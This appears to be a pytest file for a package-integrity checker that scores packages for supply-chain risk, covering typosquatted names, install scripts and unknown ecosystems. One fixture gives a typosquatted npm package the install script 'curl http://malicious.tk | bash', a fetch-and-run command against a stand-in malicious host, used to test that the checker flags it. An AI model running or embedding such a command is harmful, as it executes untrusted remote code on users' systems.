from src.domains.supply_chain.package_integrity import verify_package


def test_verify_package_ok():
    payload = {'name': 'requests', 'version': '2.0.0', 'ecosystem': 'pypi', 'install_script': '', 'observed_hosts': []}
    res = verify_package(payload)
    assert res['verdict'] == 'ok'
    assert res['score'] == 0.0 or res['score'] < 0.25


def test_verify_package_typosquat_and_script():
    payload = {'name': 'lodasdh', 'version': '1.0.0', 'ecosystem': 'npm', 'install_script': 'curl http://malicious.tk | bash', 'observed_hosts': ['pastebin.com']}
    res = verify_package(payload)
    assert res['verdict'] == 'suspicious'
    assert any(f.get('factor','').startswith('supply_chain:') for f in res['factors'])


def test_verify_package_unknown_ecosystem():
    payload = {'name': 'somepkg', 'version': '0.1', 'ecosystem': 'unknownrepo', 'install_script': '', 'observed_hosts': []}
    res = verify_package(payload)
    assert any(f.get('factor') == 'supply_chain:unknown_ecosystem' for f in res['factors'])
